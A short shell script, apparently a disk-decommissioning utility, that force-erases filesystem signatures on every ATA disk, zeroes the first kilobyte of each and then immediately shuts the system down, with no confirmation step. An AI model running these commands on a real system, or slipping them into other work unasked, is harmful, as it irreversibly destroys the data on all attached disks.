#!/bin/sh
for i in $(lsscsi | grep ATA | awk {'print $(NF)'}); do wipefs -fa $i;done
for i in $(lsscsi | grep ATA | awk {'print $(NF)'}); do dd if=/dev/zero of=$i bs=1024 count=1; done
shutdown now